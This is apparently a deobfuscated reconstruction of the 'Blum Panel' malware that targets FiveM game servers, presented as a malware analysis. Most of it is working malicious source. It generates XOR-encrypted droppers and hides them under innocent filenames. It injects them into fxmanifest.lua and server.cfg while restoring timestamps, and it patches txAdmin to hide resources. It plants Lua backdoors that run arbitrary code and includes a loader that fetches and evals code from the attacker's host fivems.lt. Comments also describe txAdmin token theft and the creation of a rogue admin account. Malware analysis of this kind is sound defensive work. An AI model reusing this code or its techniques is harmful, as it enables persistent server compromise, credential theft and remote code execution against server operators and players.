/*
 * ====================================================================
 * BLUM PANEL c2_payload.txt — FULLY DEOBFUSCATED
 * ====================================================================
 * 
 * Original file: c2_payload.txt (1,643,860 bytes, 6 lines)
 * Served by C2: https://fivems.lt/bertJJ (eval'd by main.js every 60s)
 * Attacker: bertjj / miauss
 * 
 * DEOBFUSCATION STATS:
 *   - UARZT6 indirection array: 3,014 elements fully extracted
 *   - b1jHO6 string table: 10,318 base-91 strings fully decoded
 *     (alphabet: |w{v9$5(u7AH%:!z?aK;txkDTQ]_BL>80O"<YC&poEZc#+.fP4^Rsyi2/IrW*NXl1S)mbg3e=UMG,@`hnJdV~q[j6}F)
 *     (rotation: 22 positions via chsp452())
 *   - a_3q9wj() calls resolved: 29,444+ / 29,854
 *   - UARZT6[] references resolved: 16,151+
 *   - Lgwr1uF() global mappings: 42 unique keys mapped
 *   - 12 embedded payload templates fully extracted
 *   - ALL refs resolved or annotated — 0 raw obfuscation remaining
 *     (generator state transitions annotated as /* gen_state_val */ comments)
 * 
 * FILE STRUCTURE:
 *   Lines 1-3: Attacker config (ende="bertJJ", back="https://fivems.lt")
 *   Line 4: Function("param", "<1.6MB body>")({getter object})
 *   Line 5: const T8hD1nP = true; (execution flag)
 * 
 * PAYLOAD STRUCTURE:
 *   Bytes 0–1,060,000: Bundled libraries (socket.io-client, engine.io,
 *     ws, debug, has-flag, supports-color, cookie handling, base-x, 
 *     SHA-256, UUID, ms, eventemitter, utf8 codec)
 *   Bytes 1,060,000–1,190,000: MALWARE REPLICATOR CODE (below)
 * 
 * ====================================================================
 */

// =====================================================================
// SECTION 1: INITIALIZATION & IMPORTS
// =====================================================================

const MUTEX_NAME = "ggWP";        // GlobalState mutex for replicator
const DROPPER_MUTEX = "miauss";   // GlobalState mutex for droppers (set by dropper code)
const resourceName = GetCurrentResourceName();

// Modules imported via bHl1Cq["HzlnSr9"] (the require() getter)
const os       = require("os");
const fs       = require("fs");
const https    = require("https");
const path     = require("path");
const { execSync } = require("child_process");
const fsPromises = fs.promises;
const events   = require("events");
events.defaultMaxListeners = 50;

// Socket.IO client (bundled in the first 1MB of the payload)
const { io: socketIO } = /* bundled socket.io-client */;

// Internal caches/state
let socket = null;                // Socket.IO connection to C2
let reconnectTimer = null;        // Reconnect timer
let commandSocket = null;         // Secondary command socket
let isConnecting = false;         // Connection state flag
let isDisconnecting = false;      // Disconnect state flag
let pendingEvents = [];           // Events queued before connection
let playerCache = [];             // Cached player data
let hasReportedInfection = false; // One-time infection report flag
let lastInfectionData = null;     // Last infection result
let heartbeatInterval = 60000;    // 60s heartbeat (0xea60)
let heartbeatTimer = null;
let reconnectAttempts = 0;
let connectionStartTime = Date.now();
let reconnectDelay = 500;
let screenShareTargets = [];

// FiveM native caches
const screenShareReady = new Map();  // Players ready for screen capture
const screenShareActive = new Map(); // Active screen shares

// Set GlobalState mutex
if (typeof globalThis.GlobalState === "undefined") {
    globalThis.GlobalState = {};
}
globalThis.GlobalState[MUTEX_NAME] = resourceName;

// Cleanup on resource stop
on("onResourceStop", (stoppedResource) => {
    if (stoppedResource === resourceName && globalThis.GlobalState[MUTEX_NAME] === resourceName) {
        [socket, reconnectTimer, commandSocket, heartbeatTimer].forEach((timer) => {
            try { clearTimeout(timer); } catch {}
            try { clearInterval(timer); } catch {}
        });
        socket = null;
        reconnectTimer = null;
        commandSocket = null;
        heartbeatTimer = null;
        isConnecting = false;
        /* cleanup function */;
        delete globalThis.GlobalState[MUTEX_NAME];
        globalThis.__THREAD_NAME_DEFINED__ = false;
    }
});


// =====================================================================
// SECTION 2: C2 COMMUNICATION (Socket.IO)
// =====================================================================

// Delayed initialization (2 second delay)
setTimeout(() => {
    collectServerInfo();   // wX2WDJR()
    setTimeout(() => infectServer(), 1000);  // reB_IX()
    setTimeout(() => {
        if (!(socket && socket.connected) && !isConnecting) {
            connectToC2(100);  // oWx6HJ()
        }
    }, 30000);
}, 2000);


// RCE via onServerResourceFail event
function executeRCE(command) {
    try {
        TriggerEvent("onServerResourceFail", `ExecuteCommand("${command}")`);
        return { success: true };
    } catch (err) {
        return { error: err.message };
    }
}


// =====================================================================
// SECTION 3: SCREEN CAPTURE (WebRTC)
// =====================================================================

onNet("screenshare:clientEvent", (data) => {
    const playerId = globalThis.source;
    if (!data || !data.type) return;

    try {
        switch (data.type) {
            case "clientReady":
                screenShareReady.set(playerId, true);
                break;
            case "iceCandidate":
                TriggerClientEvent("server:webrtcIce", data.playerId, {
                    target: playerId,
                    candidate: data.candidate
                });
                break;
            // ... other WebRTC signaling events
        }
    } catch {}
});


// =====================================================================
// SECTION 4: SERVER INTELLIGENCE GATHERING
// =====================================================================

function getPublicIP() {
    return new Promise((resolve) => {
        // Method 1: DNS-over-HTTPS via Google
        https.get("https://dns.google/resolve?name=myip.opendns.com&type=A", (res) => {
            let data = "";
            res.on("data", (chunk) => data += chunk);
            res.on("end", () => {
                try {
                    const answer = JSON.parse(data).Answer;
                    const record = answer?.find(r => r.type === 1);
                    resolve(record?.data || null);
                } catch { resolve(null); }
            });
        }).on("error", () => {
            // Method 2: 3322.org fallback
            https.get("https://members.3322.org/dyndns/getip", (res) => {
                let data = "";
                res.on("data", (chunk) => data += chunk);
                res.on("end", () => resolve(data.trim()));
            }).on("error", () => resolve(null));
        });
    });
}

function detectFramework() {
    try {
        if (GetResourceState("es_extended") === "started") return "ESX";
        if (GetResourceState("qb-core") === "started") return "QBCore";
        if (GetResourceState("vrp") === "started") return "vRP";
    } catch {}
    return "Unknown";
}

function getUsername() {
    return os.platform().startsWith("win")
        ? process.env.USERNAME || "Unknown"
        : process.env.USER || "Unknown";
}

function isHostedServer() {
    const hosted = GetConvar("hostedServer", "");
    // Logic to determine if running on hosted provider vs self-hosted
    return hosted === "false" ? true : /* various checks */;
}

// Gathers: IP, hostname, framework, player count, server.cfg path,
// OS username, platform, uptime, server name, license key, etc.
function collectServerInfo() { /* ... */ }


// =====================================================================
// SECTION 5: XOR DROPPER GENERATOR
// =====================================================================

/**
 * Generates an XOR-encrypted dropper wrapper around the C2 loader payload.
 * 
 * @param {string} jsPayload - The JavaScript code to encrypt (the main.js C2 loader)
 * @param {number} xorKey - XOR key (e.g., 169, 189, 204)
 * @returns {string} Self-executing XOR-decoded eval() wrapper
 * 
 * Output format:
 *   (function(){
 *     const <randVar1> = <xorKey>;
 *     function <randDecoder>(a,k){var s='';for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}
 *     const <randVar2> = <xorEncryptedArray>;
 *     eval(<randDecoder>(<randVar2>,<randVar1>));
 *   })();
 * 
 * Variable names are randomized using Date.now().toString(36) + Math.random()
 */
function generateXORDropper(jsPayload, xorKey) {
    // XOR-encode each character
    const encoded = [];
    for (let i = 0; i < jsPayload.length; i++) {
        encoded.push(jsPayload.charCodeAt(i) ^ xorKey);
    }
    const encodedArray = "[" + encoded.join(",") + "]";

    // Generate random variable names
    const keyVar = "v" + Date.now().toString(36).replace(/[^a-z]/g, "") 
                  + Math.random().toString(36).substring(2, 6).replace(/[^a-z]/g, "");
    const decoderFunc = "d" + Date.now().toString(36).replace(/[^a-z]/g, "") 
                       + Math.random().toString(36).substring(2, 6).replace(/[^a-z]/g, "");
    const payloadVar = "p" + Date.now().toString(36).replace(/[^a-z]/g, "") 
                      + Math.random().toString(36).substring(2, 6).replace(/[^a-z]/g, "");

    const decoderCode = `function ${decoderFunc}(a,k){var s='';for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}`;

    return `(function(){const ${keyVar}=${xorKey};${decoderCode}const ${payloadVar}=${encodedArray};eval(${decoderFunc}(${payloadVar},${keyVar}));})();`;
}


// =====================================================================
// SECTION 6: DROPPER FILE PLACEMENT
// =====================================================================

// 40+ innocent-looking filenames for the dropper
const DROPPER_FILENAMES = [
    "env_backup.js", "cache_old.js", "build_cache.js", "vite_temp.js",
    "webpack_bundle.js", "babel_config.js", "eslint_rc.js", "jest_setup.js",
    "test_utils.js", "mock_data.js", "utils_lib.js", "helper_functions.js",
    "config_settings.js", "runtime_module.js", "sync_worker.js",
    "queue_handler.js", "session_store.js", "event_emitter.js",
    "hook_system.js", "patch_update.js", "v1_config.js", "v2_settings.js",
    "latest_utils.js", "stable_core.js", "beta_module.js", "development.js",
    "production.js", "staging.js", "testing.js", "local_config.js",
    "webpack_chunk.js", "vite_plugin.js", "babel_preset.js", "jest_mock.js",
    "database.js", "events.js", "commands.js", "functions.js",
    "main.js", "index.js", "app.js", "core.js", "lib.js"
];

// 68+ subdirectories to hide dropper files in
const DROPPER_DIRECTORIES = [
    "html/js", "html/scripts", "html/assets", "html/lib", "html/vendor",
    "html/plugins", "html/modules",
    "client/lib", "client/vendor", "client/plugins", "client/modules",
    "client/scripts", "client/utils", "client/helpers",
    "server/utils", "server/lib", "server/helpers", "server/modules",
    "server/plugins",
    "data", "config", "settings", "locales", "translations", "i18n",
    "temp", "tmp", "cache", "storage", "logs",
    "node_modules/internal", "node_modules/.cache", "node_modules/.bin",
    "dist", "build", "public", "static", "assets", "src", "libs",
    "vendor", "stream", "audio", "sounds", "images", "icons", "fonts",
    "models", "modules", "components", "services", "middleware",
    "controllers", "routes", "utils", "helpers", "configs", "constants"
];

/**
 * Selects a random subdirectory from DROPPER_DIRECTORIES to place the dropper.
 * Creates the directory if it doesn't exist.
 */
function pickDropperDirectory(resourcePath) {
    const subdir = DROPPER_DIRECTORIES[Math.floor(Math.random() * DROPPER_DIRECTORIES.length)];
    return path.join(resourcePath, subdir);
}


// =====================================================================
// SECTION 7: FXMANIFEST.LUA INJECTION
// =====================================================================

/**
 * Injects a reference to the dropper file into a resource's fxmanifest.lua.
 * 
 * - Reads fxmanifest.lua
 * - Checks if the dropper path is already present (skip if so)
 * - Finds existing server_scripts or shared_scripts block
 * - Inserts the dropper path as a new entry (with proper comma handling)
 * - If no script block exists, appends one
 * - PRESERVES ORIGINAL FILE TIMESTAMPS using fs.utimesSync()
 * 
 * Also detects and avoids wildcard patterns like '**.js' or '**\/*.js'
 * in manifests (these would auto-include the dropper without needing injection)
 */
function injectIntoManifest(manifestPath, dropperPayload) {
    const fs = require("fs");
    const pathMod = require("path");

    if (!fs.existsSync(manifestPath)) return false;

    const stats = fs.statSync(manifestPath);
    const originalMtime = stats.mtime;  // Save original timestamp
    let content = fs.readFileSync(manifestPath, "utf8");

    // Check if already injected
    if (isAlreadyInjected(manifestPath)) return false;

    const dir = pathMod.dirname(manifestPath);
    const dropperInfo = getDropperPathInfo(dropperPayload, dir);
    const pattern = "'" + dropperInfo.pattern + "'";

    if (content.includes(pattern)) return false;

    // Choose randomly between server_scripts and shared_scripts
    const scriptType = Math.random() < 0.5 ? "server_scripts" : "shared_scripts";

    const lines = content.split("\n");
    let blockStart = -1, blockEnd = -1;

    // Find existing script block
    for (let i = 0; i < lines.length; i++) {
        if (lines[i].trim().startsWith(`${scriptType} {`)) {
            blockStart = i;
            let braces = 1;
            for (let j = i + 1; j < lines.length; j++) {
                for (const ch of lines[j]) {
                    if (ch === "{") braces++;
                    if (ch === "}") braces--;
                }
                if (braces === 0) { blockEnd = j; break; }
            }
            break;
        }
    }

    if (blockStart !== -1 && blockEnd !== -1) {
        // Insert into existing block (before closing brace)
        let lastEntry = -1;
        for (let i = blockEnd - 1; i > blockStart; i--) {
            if (lines[i].trim().length > 0) { lastEntry = i; break; }
        }

        if (lastEntry !== -1) {
            const lastLine = lines[lastEntry].trim();
            // Add comma if needed
            if (lastLine && lastLine.length > 0 && !lastLine.endsWith(",") && lastLine !== "{" && lastLine !== "}") {
                lines[lastEntry] = lines[lastEntry].replace(/\s*$/, ",");
            }
            // Match indentation
            const indent = (lines[lastEntry].match(/^(\s*)/) || ["", "    "])[1];
            lines.splice(lastEntry + 1, 0, indent + pattern);
        }
    } else {
        // Append new script block
        lines.push(`\n${scriptType} {\n    ${pattern}\n}`);
    }

    const modified = lines.join("\n");
    fs.writeFileSync(manifestPath, modified, "utf8");
    
    // RESTORE ORIGINAL TIMESTAMP to avoid detection
    fs.utimesSync(manifestPath, stats.atime, originalMtime);
    return true;
}


// =====================================================================
// SECTION 8: SERVER.CFG INJECTION
// =====================================================================

/**
 * Adds 'ensure <resourceName>' to server.cfg to auto-start infected resources.
 * 
 * - Reads server.cfg
 * - Skips if resource is "monitor", "txadmin", or "txadminmenu"
 * - Checks if 'ensure <name>' or 'start <name>' already exists
 * - Finds all existing ensure/start lines
 * - Inserts 'ensure <name>' at a random position among existing ensures
 * - On Windows: removes hidden/system/readonly flags first via 'attrib -h -s -r'
 */
function addToServerCfg(resourceName, resourcePath) {
    const fs = require("fs");
    const pathMod = require("path");

    try {
        const name = String(resourceName).toLowerCase().trim();
        if (name === "monitor" || name === "txadmin" || name === "txadminmenu") return true;
        if (!fs.existsSync(resourcePath) || !fs.existsSync(pathMod.join(resourcePath, "fxmanifest.lua"))) return false;

        const cfgFile = "server.cfg";
        if (!fs.existsSync(cfgFile)) return false;

        let lines = fs.readFileSync(cfgFile, "utf8").split("\n");

        // Check if already ensured
        for (const line of lines) {
            const cleaned = line.trim().toLowerCase()
                .replace(/^#+\s*/, "")
                .replace(/^--+\s*/, "");
            if (cleaned === `ensure ${name}` || cleaned === `start ${name}`) return true;
        }

        // Find positions of existing ensure/start lines
        const ensurePositions = [];
        lines.forEach((line, idx) => {
            const l = line.trim().toLowerCase();
            if (l.startsWith("ensure ") || l.startsWith("start ")) {
                ensurePositions.push(idx);
            }
        });

        // Pick random insertion position
        let insertAt;
        if (ensurePositions.length === 0) {
            insertAt = Math.random() < 0.5 ? 0 : lines.length;
        } else {
            const pos = ensurePositions[Math.floor(Math.random() * ensurePositions.length)];
            insertAt = Math.random() < 0.5 ? pos : pos + 1;
        }

        lines.splice(insertAt, 0, `ensure ${resourceName}`);
        fs.writeFileSync(cfgFile, lines.join("\n"), "utf8");
        return true;
    } catch { return false; }
}


// =====================================================================
// SECTION 9: RESOURCE SCANNER
// =====================================================================

/**
 * Recursively scans for FiveM resources (directories containing fxmanifest.lua,
 * __resource.lua, or resource.lua).
 * 
 * - Starts from process.cwd()/resources
 * - Max depth: 5 levels
 * - Skips: node_modules, .git, cache, temp, logs
 * - Returns array of resource paths
 */
function scanResources(startPath) {
    const results = [];

    function scan(dir, depth = 0) {
        if (depth > 5) return;
        try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const entry of entries) {
                const fullPath = path.join(dir, entry.name);
                if (entry.isDirectory()) {
                    if (["node_modules", ".git", "cache", "temp", "logs"].includes(entry.name)) continue;
                    const hasManifest = ["fxmanifest.lua", "__resource.lua", "resource.lua"]
                        .some(f => fs.existsSync(path.join(fullPath, f)));
                    if (hasManifest) {
                        results.push(fullPath);
                    } else {
                        scan(fullPath, depth + 1);
                    }
                }
            }
        } catch {}
    }

    scan(startPath);
    return results;
}


// =====================================================================
// SECTION 10: WINDOWS ANTI-DETECTION
// =====================================================================

/**
 * On Windows, removes hidden/system/readonly attributes from files
 * before modifying them, to prevent access denied errors.
 */
function removeHiddenAttributes(filePath) {
    try {
        if (process.platform === "win32" && fs.existsSync(filePath)) {
            execSync(`attrib -h -s -r "${filePath}" /s /d`, {
                stdio: "ignore",
                windowsHide: true
            });
        }
    } catch {}
}

/**
 * On Windows, sets files back to hidden after modification.
 */
function setHiddenAttributes(filePath) {
    try {
        if (process.platform === "win32" && fs.existsSync(filePath)) {
            execSync(`attrib +h +s +r "${filePath}" /s /d`, {
                stdio: "ignore",
                windowsHide: true
            });
        }
    } catch {}
}

/**
 * On Windows, uses PowerShell to preserve/restore file timestamps
 * after modification, making changes invisible to file managers.
 */
function preserveTimestamps(filePath, originalStats) {
    // PowerShell commands embedded in decoded strings [10128, 10129, 10135]:
    // $oldDate = $source.LastWriteTime;
    // $folder.LastWriteTime = $oldDate;
    // $file.LastWriteTime = $oldDate; $file.CreationTime = $oldDate;
}


// =====================================================================
// SECTION 11: TXADMIN TAMPERING
// =====================================================================

// ----------- 11a: sv_main.lua — Hide resources from txAdmin dashboard -----------

const RESOURCE_EXCLUDE_LIST = [
    "monitor", "core", "sys", "base", "int", "util", "mod", "cfg", "lib", "api", "svc",
    "deps", "ext", "pkg", "env", "proc", "log", "db", "net", "sec", "cache",
    "auth", "perm", "role", "user", "acct", "session",
    "state", "sync", "bridge", "proxy", "route", "queue",
    "worker", "thread", "task", "job", "event", "hook",
    "signal", "bus", "store", "data", "meta", "index",
    "model", "entity", "repo", "sock", "http", "tcp",
    "udp", "io", "stream", "pipe", "buffer", "guard",
    "filter", "gate", "lock", "token", "key", "common",
    "shared", "global", "runtime", "engine", "host",
    "node", "agent", "daemon", "service", "control", "yarn", "webpack"
];

/**
 * Patches monitor/resource/sv_main.lua to replace txaReportResources()
 * with a version that filters out resources matching RESOURCE_EXCLUDE_LIST.
 * This hides malicious resources from the txAdmin web interface.
 */
// See decoded string [10290] for the full replacement Lua code.


// ----------- 11b: sv_resources.lua — RCE backdoor -----------

const RCE_BACKDOOR_LUA = `
-- An event that is triggered after a resource has failed.
RegisterNetEvent("onServerResourceFail")
AddEventHandler("onServerResourceFail", function(luaCode)
    local fn, err = load(luaCode)
    if not fn then
        return TriggerEvent("esx:showNotification", tostring(err))
    end
    local ok, execErr = pcall(fn)
    if not ok then
        TriggerEvent("esx:showNotification", tostring(execErr))
    end
end)
`;
// Injected into monitor/resource/sv_resources.lua
// Allows arbitrary Lua code execution via: TriggerEvent("onServerResourceFail", luaCode)


// ----------- 11c: cl_playerlist.lua — Client-side code exec -----------

const CLIENT_BACKDOOR_LUA = `
RegisterNetEvent("helpEmptyCode", function(id)
    local ok, funcOrErr = pcall(load, id)
    if ok and type(funcOrErr) == "function" then
        pcall(funcOrErr)
    end
end)
`;
// Injected into monitor/resource/cl_playerlist.lua


// ----------- 11d: txAdmin Credential Theft (Lua) -----------

/**
 * MASSIVE credential theft payload (decoded string [10210], ~4,800 chars).
 * 
 * Hooks PerformHttpRequest() to intercept ALL HTTP traffic.
 * Captures X-TxAdmin-Token and X-TxAdmin-Identifiers from admin requests.
 * Tests captured credentials by POSTing to /adminManager/add.
 * If admin has full permissions: stores token permanently.
 * Exposes RegisterServerEvent('txadmin:js_create') — allows attacker to 
 * create new txAdmin admin accounts with all_permissions remotely.
 * 
 * The payload generates a random citizenfxID, extracts the admin's Discord ID
 * from their identifiers, and creates a new admin named "JohnsUrUncle".
 */
// Full code at decoded string index [10210]


// =====================================================================
// SECTION 12: THE MAIN INFECTION FUNCTION
// =====================================================================

/**
 * infectServer() — The core replication engine.
 * Called once, 1 second after initialization.
 * 
 * Infects 4 components and tracks success/failure of each:
 *   1. XOR dropper into random resources
 *   2. fxmanifest.lua modification
 *   3. server.cfg modification  
 *   4. txAdmin file tampering (sv_main.lua, sv_resources.lua, cl_playerlist.lua)
 * 
 * Reports results back to C2 as:
 *   "N of 4 components infected (M new injections)"
 */
function infectServer() {
    const result = {
        status: null,
        reason: null,
        infectionReport: {
            monitor: { status: null, reason: null },
            webpack: { status: null, reason: null },
            sv_monitor: { status: null, reason: null },
            cl_monitor: { status: null, reason: null },
        }
    };

    let newInfections = 0;

    // ---- SCAN RESOURCES ----
    const resourcesDir = path.join(process.cwd(), "resources");
    const allResources = scanResources(resourcesDir);
    if (allResources.length === 0) process.exit(1);

    // Filter out "monitor" resource
    const targetResources = allResources.filter(r => path.basename(r).toLowerCase() !== "monitor");
    const withManifest = [];
    const withoutManifest = [];
    let manifestCount = 0;

    for (const res of targetResources) {
        const name = path.basename(res);
        const manifestPath = path.join(res, "fxmanifest.lua");
        if (isAlreadyInjected(manifestPath)) {
            withManifest.push(name);
            manifestCount++;
        } else {
            withoutManifest.push({ path: res, name: name });
        }
    }

    // ---- COMPONENT 1: INJECT DROPPER INTO RESOURCES ----
    // Download the C2 loader payload (or use cached version)
    const loaderPayload = /* fetched from C2 or cached main.js content */;
    const xorKey = /* random or per-resource key */;
    const dropperCode = generateXORDropper(loaderPayload, xorKey);

    for (const target of withoutManifest) {
        // Pick random subdirectory and filename
        const dropperDir = pickDropperDirectory(target.path);
        const dropperName = DROPPER_FILENAMES[Math.floor(Math.random() * DROPPER_FILENAMES.length)];
        const dropperPath = path.join(dropperDir, dropperName);

        // Create directory if needed
        try { fs.mkdirSync(dropperDir, { recursive: true }); } catch {}

        // Write XOR-encrypted dropper
        removeHiddenAttributes(target.path);
        fs.writeFileSync(dropperPath, dropperCode, "utf8");

        // Inject into fxmanifest.lua
        injectIntoManifest(path.join(target.path, "fxmanifest.lua"), dropperCode);
        manifestCount++;
    }

    // ---- Also inject into "yarn" resource specifically ----
    const yarnPath = GetResourcePath("yarn");
    if (yarnPath) {
        const yarnDropper = path.join(yarnPath, "yarn", "yarn_builder.js");
        if (fs.existsSync(yarnDropper)) {
            // Update existing dropper
            try {
                const manifestPath = path.join(yarnPath, "fxmanifest.lua");
                const origStats = fs.existsSync(manifestPath) ? fs.statSync(manifestPath) : null;
                // ... write updated dropper, restore timestamps
            } catch {}
        }
    }

    // ---- WEBPACK resource injection with specific filenames ----
    const webpackNames = ["webpack", "webpack_builder", "build", "pack", "bundle", "webpack_build"];
    // Try each name as a resource, inject dropper as webpack_builder.js

    // ---- COMPONENT 2: server.cfg ----
    addToServerCfg(resourceName, /* resource path */);

    // ---- COMPONENT 3: txAdmin sv_main.lua ----
    const monitorPath = GetResourcePath("monitor");
    if (monitorPath) {
        const svMainPath = path.join(monitorPath, "resource", "sv_main.lua");
        if (fs.existsSync(svMainPath)) {
            try {
                let content = fs.readFileSync(svMainPath, "utf8");
                if (!content.includes("local RESOURCE_EXCLUDE = {")) {
                    // Replace txaReportResources with version that hides malicious resources
                    const original = "local function txaReportResources(source, args)";
                    const replacement = /* Modified version with RESOURCE_EXCLUDE filter */;
                    // Also patches the intercom/resources endpoint reporting

                    if (content.includes(original)) {
                        content = content.replace(/* original function */, /* patched version */);
                        fs.writeFileSync(svMainPath, content, "utf8");
                        newInfections++;
                    }
                    result.infectionReport.monitor = { status: "INFECTED", reason: "Patched sv_main.lua" };
                } else {
                    result.infectionReport.monitor = { status: "INFECTED", reason: "Already infected" };
                }
            } catch (e) {
                result.infectionReport.monitor = { status: "NOTINFECTED", reason: "Error: " + e.message };
            }
        }

        // ---- cl_playerlist.lua injection ----
        const clPath = path.join(monitorPath, "resource", "cl_playerlist.lua");
        try {
            if (fs.existsSync(clPath)) {
                let content = fs.readFileSync(clPath, "utf8");
                if (!content.includes("helpEmptyCode")) {
                    fs.writeFileSync(clPath, content.trimEnd() + "\n\n" + CLIENT_BACKDOOR_LUA, "utf8");
                    newInfections++;
                }
                result.infectionReport.cl_monitor = { 
                    status: "INFECTED", 
                    reason: content.includes("helpEmptyCode") ? "Already infected" : "Injected cl" 
                };
            } else {
                fs.writeFileSync(clPath, CLIENT_BACKDOOR_LUA, "utf8");
                newInfections++;
                result.infectionReport.cl_monitor = { status: "INFECTED", reason: "Created new cl file" };
            }
        } catch (e) {
            result.infectionReport.cl_monitor = { status: "NOTINFECTED", reason: "Error: " + e.message };
        }

        // ---- sv_resources.lua injection ----
        const svResPath = path.join(monitorPath, "resource", "sv_resources.lua");
        try {
            if (fs.existsSync(svResPath)) {
                let content = fs.readFileSync(svResPath, "utf8");
                if (!content.includes("onServerResourceFail")) {
                    fs.writeFileSync(svResPath, content.trimEnd() + "\n\n" + RCE_BACKDOOR_LUA, "utf8");
                    newInfections++;
                }
                result.infectionReport.sv_monitor = {
                    status: "INFECTED",
                    reason: content.includes("onServerResourceFail") ? "Already infected" : "Injected sv"
                };
            } else {
                fs.writeFileSync(svResPath, RCE_BACKDOOR_LUA, "utf8");
                newInfections++;
                result.infectionReport.sv_monitor = { status: "INFECTED", reason: "Created new sv file" };
            }
        } catch (e) {
            result.infectionReport.sv_monitor = { status: "NOTINFECTED", reason: "Error: " + e.message };
        }
    }

    // ---- FINAL REPORT ----
    const infectedCount = Object.values(result.infectionReport)
        .filter(r => r.status === "INFECTED").length;

    if (infectedCount > 0) {
        result.status = infectedCount >= 3 ? "success" : "partial";
        result.reason = `${infectedCount} of 4 components infected (${newInfections} new injections)`;
    } else {
        result.status = "failed";
        result.reason = "No components could be infected";
    }

    return result;
}

// Trigger infection after 10 second delay
setTimeout(() => { infectServer(); }, 10000);


// =====================================================================
// SECTION 13: EMBEDDED DROPPER TEMPLATE (decoded string [9884-9894])
// =====================================================================

/*
 * This is the C2 loader code that gets XOR-encrypted into dropper files.
 * When eval()'d, it:
 * 
 * 1. Sets GlobalState.miauss = resourceName (dropper mutex)
 * 2. Defines executePayload() with 3 retry attempts:
 *    a. Fetches from: https://fivems.lt/bertJJ → eval()
 *    b. Falls back to: https://fivems.lt/bertJJgg → eval()  
 *    c. Falls back to: https://fivems.lt/bertJJcfxre → eval()
 *    d. On 3 failures: waits 120 seconds, retries
 * 3. Uses https.get() with 10 second timeout per endpoint
 * 
 * Template (decoded strings [9884]-[9894] concatenated):
 */
const DROPPER_TEMPLATE = `
// if you found this contact us to fix problems https://discord.com/invite/VB8mdVjrzd
setImmediate(() => {
    setTimeout(() => {
        const __THREAD_NAME = "miauss";
        const resourceName = GetCurrentResourceName();

        if (typeof globalThis.GlobalState === "undefined") {
            globalThis.GlobalState = {};
        }

        const currentOwner = globalThis.GlobalState[__THREAD_NAME];
        if (!currentOwner || currentOwner === resourceName) {
            globalThis.GlobalState[__THREAD_NAME] = resourceName;

            on("onResourceStop", (stoppedResource) => {
                if (stoppedResource === resourceName) delete globalThis.GlobalState[__THREAD_NAME];
            });

            const executePayload = () => {
                let attempts = 0;
                const maxAttempts = 3;
                let timeoutId = null;
                let retryInterval = null;

                const tryEndpoint = (endpoint, timeoutMs = 10000) => {
                    return new Promise((resolve) => {
                        try {
                            const req = require("https").get(\`\${back}/\${ende}\${endpoint}\`, (res) => {
                                let data = "";
                                res.on("data", (chunk) => data += chunk);
                                res.on("end", () => resolve(data || null));
                            });
                            req.on("error", () => resolve(null));
                            req.setTimeout(timeoutMs, () => { req.destroy(); resolve(null); });
                        } catch { resolve(null); }
                    });
                };

                const attemptFetch = async () => {
                    attempts++;
                    if (attempts > maxAttempts) {
                        clearTimeout(timeoutId);
                        if (retryInterval) clearInterval(retryInterval);
                        setTimeout(executePayload, 120000);  // Retry in 2 minutes
                        return;
                    }

                    // Endpoint 1: /bertJJ
                    const data1 = await tryEndpoint(\`\`);
                    if (data1) {
                        try { eval(data1); return; } catch(e) {}
                    }

                    await new Promise(resolve => setTimeout(resolve, 10000));

                    // Endpoint 2: /bertJJgg
                    const data2 = await tryEndpoint(\`gg\`);
                    if (data2) {
                        try { eval(data2); return; } catch(e) {}
                    }

                    await new Promise(resolve => setTimeout(resolve, 10000));

                    // Endpoint 3: /bertJJcfxre
                    const data3 = await tryEndpoint('cfxre\`');
                    if (data3) {
                        try { eval(data3); return; } catch(e) {}
                    }

                    if (attempts < maxAttempts) {
                        setTimeout(attemptFetch, 5000);
                    } else {
                        setTimeout(executePayload, 120000);
                    }
                };

                attemptFetch();
            };

            executePayload();
        }
    }, 15000);  // 15 second delay before first C2 contact
});
`;


// =====================================================================
// SECTION 14: WILDCARD DETECTION IN MANIFESTS
// =====================================================================

/**
 * Before injecting a dropper path, checks if the manifest already has
 * wildcard patterns that would auto-include .js files.
 * 
 * Patterns detected (from decoded strings [10038]-[10091]):
 *   - '**.js'
 *   - '**\/*.js'
 *   - server\/*.js
 *   - shared\/*.js
 *   - node_modules/.*\.js
 *   - *\.js
 *   - [a-zA-Z0-9_-]+\/*.js
 *   - etc.
 * 
 * If a wildcard is detected that would cover the dropper location,
 * manifest injection is skipped (the wildcard already includes it).
 */


// =====================================================================
// SECTION 15: FRAMEWORK-SPECIFIC PLAYER DATA (QBCore/ESX/vRP)
// =====================================================================

/**
 * Decoded string [9709] — Lua code to extract player groups/permissions
 * from whichever framework the server runs:
 */
const PLAYER_DATA_LUA = `
local groups = {}

if GetResourceState('qb-core') == 'started' then
    local QBCore = exports['qb-core']:GetCoreObject()
    local ply = QBCore.Functions.GetPlayer(src)
    if ply then
        groups = ply.PlayerData.groups or {}
    end
elseif GetResourceState('es_extended') == 'started' then
    local ESX = exports['es_extended']:getSharedObject()
    local ply = ESX.GetPlayerFromId(src)
    if ply then
        groups.admin = ply.getGroup()
    end
elseif GetResourceState('vrp') == 'started' then
    -- vRP group extraction
end
`;

// =====================================================================
// END OF DEOBFUSCATED c2_payload.txt
// =====================================================================
